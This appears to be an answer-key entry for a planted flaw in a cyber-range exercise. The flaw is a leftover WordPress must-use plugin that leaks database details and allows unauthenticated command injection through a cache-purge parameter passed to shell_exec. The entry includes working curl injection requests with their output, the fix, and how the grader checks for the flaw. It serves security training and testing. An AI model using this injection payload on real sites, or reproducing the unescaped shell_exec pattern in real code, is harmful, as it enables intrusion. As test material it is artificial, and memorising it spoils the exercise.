# Answer: muplugin

| | |
|---|---|
| Flaw id | `muplugin` |
| Reference | none. A misconfiguration left by a contractor, in the pattern of CWE-78 |
| Where | `/var/www/larkspur/wp-content/mu-plugins/agency-support.php`, on web-01 |
| Needs a login | no |
| Gives | code run as `www-data` |
| Axis | entry |
| Verified | no. Written 2026-10-30; the range run has still to prove it (see the last line) |

## The bug

The agency that built the site in 2019, Blue Ridge Web Co., left its remote support helper behind as a
must-use plugin. WordPress loads every PHP file in `wp-content/mu-plugins/` on every request, with no
record in the database and no way to turn it off from the admin pages. The plugins page shows it only
under a separate "Must-Use" tab, with no activate or deactivate control, and `wp plugin list` shows it as
status `must-use` among the shop's own plugins. So it reads as part of the platform rather than as
something the shop chose, and a defender who goes down the plugin list looking for what to disable has
nothing to disable here.

The helper hangs on `init` and does nothing at all unless the request carries `asup`. Two tasks answer:

- `?asup=env` prints the site URL, the WordPress and PHP versions and the `DB_HOST`, `DB_NAME` and
  `DB_USER` of `wp-config.php`. It never prints the password, but it names the database server, which is
  how the attacker learns that the data is on 10.20.0.20 without reading a file.
- `?asup=purge&path=<folder>` clears cached files. It builds the command line as text:

        shell_exec( 'rm -rfv ' . WP_CONTENT_DIR . '/cache/' . $path . ' 2>&1' )

  `$path` comes straight from the query string. The helper strips `..` from it, which is the only check
  there is, and that check says nothing about `;`, `|` or backticks. So a semicolon in `path` ends the
  `rm` and runs anything else as `www-data`.

No login, no nonce, no capability check: the agency wanted to be able to clear a cache for a client who
could not log in.

## Proof

    curl -s 'http://larkspurcycles.com/?asup=purge&path=none;%20id'
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

    curl -s 'http://larkspurcycles.com/?asup=env'
    support   1.3.2
    site      http://larkspurcycles.com
    wordpress 6.6.2
    php       8.2.x
    db_host   10.20.0.20
    db_name   wordpress
    db_user   wp_larkspur

A shell follows the same way, for example a reverse connection or a file written into the uploads folder.
`www-data` is not root and is not in the sudoers file, so this is only the way in; the way up is a separate
flaw (`filecap`, or `sudoscript` by way of the `deploy` account).

## The correct fix

Delete `wp-content/mu-plugins/agency-support.php`. The agency has not looked after the site since 2019 and
nothing on the site calls the helper, so there is nothing to keep. A shop that wants to keep the cache
purge must escape the argument (`escapeshellarg`), or better pass a folder name it chose itself, and must
put the task behind a capability check.

Anything that stops the injected command counts: the file gone, the task gone, the argument escaped, or
PHP no longer reached for that request.

## Grader

`check.sh` runs in the traffic role, as a customer. It sends one purge request whose `path` is a folder
that does not exist followed by `; echo <random token>`, and looks for the token in the answer. The token
is new on every run, so a cached or guessed answer cannot pass it, and the folder it names is not there,
so nothing of the shop's is removed. If the token is absent, the check fetches the front page: 200 means
fixed, anything else means the shop is down (exit 2), which is not a fix.

`FLAW_PROGRESS=nocontent:...=shell_exec` lets the control plane see, once a minute and without touching
the host, that the file no longer holds the call.

Not yet verified: that `wp-content/mu-plugins/` is where this WordPress reads must-use plugins from and
that the plugin loads from there at all; that `php -l` passes and the site still answers 200 with the
plugin in place; that the purge answer carries the injected command's output back to the customer (that
`shell_exec` is not disabled in this php-fpm pool); and that `check.sh` sees the token.
